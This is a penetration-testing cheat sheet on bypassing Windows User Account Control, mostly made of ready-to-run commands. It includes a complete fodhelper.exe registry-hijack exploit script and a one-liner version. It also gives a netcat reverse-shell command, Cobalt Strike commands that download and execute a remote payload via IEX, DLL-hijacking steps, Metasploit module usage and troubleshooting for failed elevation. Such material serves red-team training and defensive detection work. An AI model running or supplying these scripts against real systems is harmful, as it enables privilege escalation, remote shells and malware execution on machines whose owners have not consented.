# UAC Trust Boundary Bypass

### Overview

**User Account Control (UAC)** is a Windows security feature that prevents unauthorized changes to the operating system by requiring administrator approval for privileged operations. UAC bypass techniques allow attackers who have already compromised a user account that belongs to the Administrators group to elevate their process from medium integrity level to high integrity level without triggering a UAC prompt.

**Key Concepts:**

* **Integrity Levels** - Security boundaries that restrict what processes can do (Low, Medium, High, System)
* **Auto-Elevation** - Certain Microsoft-signed binaries automatically run with high privileges without prompting
* **Medium Integrity** - Standard user-level privileges where most applications run
* **High Integrity** - Administrator-level privileges required for system changes

**Prerequisites for UAC Bypass:**

* UAC must be enabled on the target system
* Current process running at medium integrity level
* Current user is member of Administrators group
* Target UAC level is NOT set to "Always Notify" (highest security)

**Common Registry Paths:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System`
* `HKCU\Software\Classes\ms-settings\Shell\Open\command` (fodhelper bypass)

***

### Exploitation Workflow Summary

1. Initial Assessment ├─ Check UAC status and level ├─ Verify user group membership ├─ Identify current integrity level └─ Determine bypass feasibility
2. Technique Selection ├─ Assess Windows version and build ├─ Check for GUI access availability ├─ Identify auto-elevated binaries └─ Select appropriate bypass method
3. Bypass Execution ├─ Prepare payload (reverse shell, command) ├─ Set up registry keys or DLL hijacking ├─ Trigger auto-elevated process └─ Verify elevation success
4. Post-Exploitation ├─ Confirm high integrity level achieved ├─ Clean up artifacts (registry keys, files) └─ Maintain persistence if needed
5. Alternative Methods ├─ Use GUI interaction if available ├─ Leverage COM object manipulation └─ Exploit token duplication vulnerabilities

***

### Understanding UAC Mechanics

#### Auto-Elevation Process

**What is auto-elevation:** Auto-elevation allows certain Microsoft-signed binaries to run with high privileges automatically without showing a UAC prompt to the user.

**Requirements for auto-elevation:**

* Binary must have `autoElevate` set to `True` in its manifest
* Binary must be digitally signed by Microsoft
* User must be member of Administrators group

**How attackers exploit this:** Attackers abuse auto-elevated binaries by making them execute arbitrary code. Since the binary runs at high integrity, any code it executes also runs at high integrity.

**Example auto-elevated binaries:**

```
C:\Windows\System32\fodhelper.exe
C:\Windows\System32\computerdefaults.exe
C:\Windows\System32\sdclt.exe
```

**Checking a binary's manifest:**

```cmd
# Using Sysinternals sigcheck tool
sigcheck.exe -m C:\Windows\System32\fodhelper.exe
```

**Expected output:**

```xml
<autoElevate>true</autoElevate>
```

#### COM Objects and RPC

**What are COM objects:** Component Object Model (COM) objects are Windows components that allow different programs to communicate and share functionality across processes.

**Why they matter for UAC bypass:** Some COM objects, like `IFileOperation`, can perform privileged operations (copying files to protected locations) and automatically elevate without prompting when called from medium integrity processes.

**Common exploitable COM object:**

```
IFileOperation - Handles file operations with auto-elevation
```

**PEB Spoofing technique:** The Process Environment Block (PEB) contains information about a process, including its executable path. Attackers can modify the PEB to fake their process location, making it appear to run from a trusted directory like `C:\Windows\System32`, which tricks COM objects into granting elevation.

***

### Checking UAC Configuration

#### Verify UAC Status

**Check if UAC is enabled:**

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

**Output interpretation:**

```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

**Values explained:**

* `0x1` (1) - UAC is enabled
* `0x0` (0) or missing - UAC is disabled

#### Check UAC Security Level

**Query the prompt behavior:**

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

**Security levels:**

| Value | Behavior          | Secure Desktop | Description                          |
| ----- | ----------------- | -------------- | ------------------------------------ |
| 0     | Never prompt      | N/A            | Like UAC disabled                    |
| 1     | Credential prompt | Yes            | Ask for username/password            |
| 2     | Always notify     | Yes            | Always prompt for confirmation       |
| 3     | Credential prompt | No             | Like 1, without Secure Desktop       |
| 4     | Consent prompt    | No             | Like 2, without Secure Desktop       |
| 5     | Default           | No             | Prompt for non-Windows binaries only |

**Why this matters:** Level 2 (Always Notify) is the most secure and hardest to bypass. Most systems use level 5 (default), which is more vulnerable to bypass techniques.

#### Check Token Filter Policies

**LocalAccountTokenFilterPolicy:**

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v LocalAccountTokenFilterPolicy
```

**Values:**

* `0` - Only RID 500 (built-in Administrator) can perform admin tasks without UAC
* `1` - All accounts in Administrators group can perform admin tasks

**FilterAdministratorToken:**

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v FilterAdministratorToken
```

**Values:**

* `0` (default) - Built-in Administrator can do remote admin tasks
* `1` - Built-in Administrator cannot do remote admin tasks (unless LocalAccountTokenFilterPolicy = 1)

#### UAC Configuration Summary

**Scenario 1 - No UAC for anyone:**

```
EnableLUA = 0 (or doesn't exist)
```

**Scenario 2 - No UAC for anyone:**

```
EnableLUA = 1
LocalAccountTokenFilterPolicy = 1
```

**Scenario 3 - No UAC for RID 500 only:**

```
EnableLUA = 1
LocalAccountTokenFilterPolicy = 0
FilterAdministratorToken = 0
```

**Scenario 4 - UAC for everyone:**

```
EnableLUA = 1
LocalAccountTokenFilterPolicy = 0
FilterAdministratorToken = 1
```

#### Verify User Context

**Check user group membership:**

```cmd
net user %username%
```

**Check current integrity level:**

```cmd
whoami /groups | findstr Level
```

**Expected output for medium integrity:**

```
Mandatory Label\Medium Mandatory Level
```

**Expected output for high integrity:**

```
Mandatory Label\High Mandatory Level
```

***

### UAC Bypass Techniques

#### When UAC is Disabled

**If ConsentPromptBehaviorAdmin = 0:** UAC prompts are disabled, allowing direct elevation.

**Execute with admin privileges:**

```powershell
# Start process as administrator
Start-Process powershell -Verb runAs "calc.exe"

# Reverse shell example
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

**Parameters explained:**

* `Start-Process` - PowerShell cmdlet to start new process
* `-Verb runAs` - Request administrator privileges
* `"command"` - Command to execute with elevation

**Why this works:** When UAC prompts are disabled, the `runAs` verb elevates without requiring user interaction.

#### Registry Hijacking - fodhelper.exe

**Overview:** The `fodhelper.exe` binary (Manage Optional Features) is auto-elevated and queries a user-controllable registry path without proper validation.

**Understanding the vulnerability:** When `fodhelper.exe` launches, it checks the registry path `HKCU\Software\Classes\ms-settings\Shell\Open\command` for a command to execute. Since this is in HKEY\_CURRENT\_USER (HKCU), standard users can write to it.

**Step 1 - Create malicious registry keys:**

```powershell
# Create the registry path
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null

# Create empty DelegateExecute value (required)
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
```

**Step 2 - Set your payload:**

```powershell
# Example: Launch cmd.exe with high privileges
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe" -Force

# Example: Execute base64-encoded PowerShell
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PAYLOAD>" -Force
```

**Step 3 - Trigger elevation:**

```powershell
Start-Process -FilePath "C:\Windows\System32\fodhelper.exe"
```

**Step 4 - Clean up artifacts:**

```powershell
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

**Complete exploit script:**

```powershell
# Create registry structure
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# Set payload (replace with your command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c start cmd.exe" -Force

# Trigger
Start-Process -FilePath "C:\Windows\System32\fodhelper.exe"

# Wait for execution then cleanup
Start-Sleep -Seconds 3
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

**32-bit to 64-bit PowerShell transition:** If running from a 32-bit shell on 64-bit Windows:

```powershell
C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "$PSVersionTable.PSEdition"
```

**Why this works:**

* `fodhelper.exe` is Microsoft-signed and auto-elevated
* It reads from user-writable HKCU registry path
* No validation of the command to execute
* Spawned process inherits high integrity level

#### File System Access via SMB

**Basic technique (legacy):**

```cmd
# Mount C$ share locally
net use Z: \\127.0.0.1\c$

# Access as new drive
cd Z:\

# Direct access without mounting
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

**Why this might work:** The C$ administrative share provides full file system access when accessed locally with admin credentials.

**Important note:** This technique no longer works reliably on modern Windows versions.

#### Token Duplication

**Concept:** Token duplication exploits allow copying a high-integrity access token from an elevated process to a medium-integrity process.

**Cobalt Strike examples:**

```
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]

# UAC bypass via service
elevate svc-exe [listener_name]

# With command execution
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/payload'))"

# Using CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/payload'))"
```

**Why this works:** Certain COM interfaces and processes expose functionality that can be invoked to duplicate or impersonate higher-privileged tokens.

#### GUI-Based Bypass

**Interactive approach:** If you have GUI access, simply click "Yes" on the UAC prompt when it appears.

**Leveraging existing elevated processes:** If connected to an active user session (via RDP), some applications running as administrator (like Event Viewer, Task Manager) can spawn new processes without additional UAC prompts.

**Why this matters:** More stealthy than creating new elevated processes, as the user already accepted the original elevation.

#### Automated UACME Tool

**About UACME:** UACME is a compilation of UAC bypass techniques with multiple methods numbered sequentially.

**Check Windows version:**

```powershell
[environment]::OSVersion.Version
```

**Output example:**

```
Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

**Usage considerations:**

* Different techniques work on different Windows versions
* Some bypasses are noisy and alert users
* Requires compilation with Visual Studio or MSBuild
* Multiple executables created, select appropriate one

**General execution pattern:**

```cmd
Akagi.exe [method_number]
```

***

### Advanced Bypass Methodology

#### DLL Hijacking for UAC Bypass

**Step 1 - Find auto-elevated binary:**

```cmd
# Check process integrity in Process Explorer
# Look for processes running as Administrator (High Integrity)

# Verify auto-elevation in manifest
sigcheck.exe -m target_binary.exe
```

**Step 2 - Identify DLL hijacking opportunity:**

```
# Use Process Monitor (procmon) to capture binary execution
# Filter for "NAME NOT FOUND" events
# Look for DLL loads from writable locations
```

**Step 3 - Write DLL to protected path:**

**Windows 7/8/8.1 - Using wusa.exe:**

```cmd
# wusa.exe can extract CAB files to protected paths
# Create CAB containing malicious DLL
# Execute: wusa.exe malicious.cab /extract:C:\Windows\System32
```

**Windows 10 - Using IFileOperation COM:**

```
# IFileOperation COM object can copy files to protected locations
# Requires COM manipulation code (typically C++ or PowerShell)
```

**Step 4 - Trigger vulnerable binary:**

```cmd
# Execute the auto-elevated binary
# It will load your DLL from hijacked path
# DLL executes with high integrity
```

#### Registry-Based Command Execution

**Concept:** Monitor auto-elevated binaries that read registry values (especially HKCU) to determine what command or binary to execute.

**General approach:**

1. Identify binary that reads from HKCU registry
2. Create or modify that registry key with your payload
3. Execute the auto-elevated binary
4. Binary executes your payload with high integrity

**Example pattern:**

```powershell
# Create registry key the binary will read
New-Item -Path "HKCU:\Software\[TargetApp]\[Command]" -Force

# Set your command
Set-ItemProperty -Path "HKCU:\Software\[TargetApp]\[Command]" -Name "(default)" -Value "malicious_command.exe"

# Trigger the binary
Start-Process "C:\Windows\System32\target_binary.exe"
```

***

### Framework-Specific Methods

#### Metasploit

**Gather UAC information:**

```
use post/windows/gather/win_privs
run
```

**UAC bypass modules:**

```
# Search for UAC bypass modules
search type:exploit platform:windows uac

# Example usage
use exploit/windows/local/bypassuac
set SESSION [session_id]
run
```

#### Empire Framework

**UAC bypass modules available:**

```
# List UAC bypass modules in Empire
# Multiple techniques implemented
# Select based on target Windows version
```

#### Cobalt Strike

**Built-in UAC bypass commands:**

```
# Token duplication method
elevate uac-token-duplication [listener]

# Service-based method
elevate svc-exe [listener]

# RunAsAdmin with token duplication
runasadmin uac-token-duplication [command]

# RunAsAdmin with CMSTPLUA
runasadmin uac-cmstplua [command]
```

**Requirements:**

* UAC must NOT be set to maximum security level
* User must be in Administrators group
* Need interactive shell session

***

### Special Considerations

#### Meterpreter Session Requirements

**Why standard shells aren't enough:** Most UAC bypass techniques require full interactive capabilities that basic shells (like `nc.exe`) don't provide.

**Migrate to interactive process:**

```
# In Meterpreter, migrate to process with Session = 1
migrate [explorer.exe PID]
```

**Why explorer.exe:**

* Always running for logged-in users
* Has Session value = 1 (interactive session)
* Stable process for migration

#### Noisy Brute-Force Approach

**ForceAdmin technique:** Continuously prompts user for elevation until they accept.

**When to use:**

* Testing user awareness
* Social engineering scenarios
* When stealth is not required

**Why avoid in real attacks:**

* Extremely noisy
* Alerts security monitoring
* Annoys users, likely to be reported
* Not suitable for professional engagements

***

### Troubleshooting

#### Bypass Fails to Elevate

**Problem:** Registry-based bypass creates keys but doesn't elevate.

**Solution:**

```powershell
# Verify registry keys were created
Get-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command"

# Check if DelegateExecute is empty string (not missing)
# Recreate with explicit empty value
New-ItemProperty -Path "..." -Name "DelegateExecute" -Value "" -Force
```

**Why it works:** The DelegateExecute value must exist and be empty. If missing or populated, the bypass fails.

#### Wrong Integrity Level

**Problem:** Spawned process still shows medium integrity.

**Check integrity level:**

```cmd
whoami /groups | findstr Level
```

**Common causes:**

* Binary not actually auto-elevated
* Additional checks in binary not bypassed
* Payload spawned child process instead of running directly

**Solution:** Verify the auto-elevated binary truly runs at high integrity before attempting bypass.

#### 32-bit vs 64-bit Issues

**Problem:** Bypass works in testing but fails on target.

**Solution:**

```powershell
# Ensure using correct PowerShell architecture
# From 32-bit shell, use sysnative to access 64-bit
C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe

# Verify architecture
[Environment]::Is64BitProcess
```

**Why it works:** Some bypasses require 64-bit processes. The `sysnative` folder provides access to 64-bit system files from 32-bit processes.

#### Payload Not Executing

**Problem:** Registry modified successfully, binary triggered, but no execution.

**Check paths:**

```powershell
# Verify full paths used
Get-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command"

# Ensure absolute paths
Set-ItemProperty ... -Value "C:\Windows\System32\cmd.exe"
```

**Why it works:** Relative paths may not resolve correctly in the elevated context. Always use absolute paths.

***

### Quick Reference

#### Check UAC Status

```cmd
# Is UAC enabled?
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

# What security level?
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

# Current user's integrity
whoami /groups | findstr Level

# User group membership
net user %username%
```

#### fodhelper.exe Bypass (One-Liner)

```powershell
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null; New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe" -Force; Start-Process "C:\Windows\System32\fodhelper.exe"; Start-Sleep 3; Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

#### Verify Binary Auto-Elevation

```cmd
# Check manifest
sigcheck.exe -m binary.exe | findstr autoElevate

# Monitor with Process Explorer
# Check integrity level of running process
```

#### Framework Commands

```bash
# Metasploit
use post/windows/gather/win_privs
use exploit/windows/local/bypassuac

# Cobalt Strike
elevate uac-token-duplication [listener]
runasadmin uac-token-duplication [command]
```

